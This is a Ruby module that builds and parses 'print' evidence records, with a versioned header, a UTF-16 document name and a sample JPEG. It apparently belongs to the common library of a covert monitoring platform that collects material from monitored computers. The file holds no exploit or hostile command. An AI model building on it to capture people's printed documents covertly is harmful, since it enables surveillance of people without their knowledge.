require 'rcs-common/evidence/common'

module RCS

module PrintEvidence
  
  PRINT_VERSION = 2009031201
  
  def content
    path = File.join(File.dirname(__FILE__), 'content', 'print', '001.jpg')
    File.open(path, 'rb') {|f| f.read }
  end
  
  def generate_content
    [ content ]
  end
  
  def additional_header
    name = 'ASP_Common.h'.to_utf16le_binary
    header = StringIO.new
    header.write [PRINT_VERSION, name.size].pack("I*")
    header.write name

    header.string
  end
  
  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete evidence") if data.nil? or data.size == 0

    binary = StringIO.new data

    version, name_len = binary.read(8).unpack("I*")
    raise EvidenceDeserializeError.new("invalid log version for print") unless version == PRINT_VERSION

    @info[:name] = binary.read(name_len).utf16le_to_utf8
  end

  def decode_content
    @info[:content] = @info[:chunks].first
    return [self]
  end
end

end # ::RCS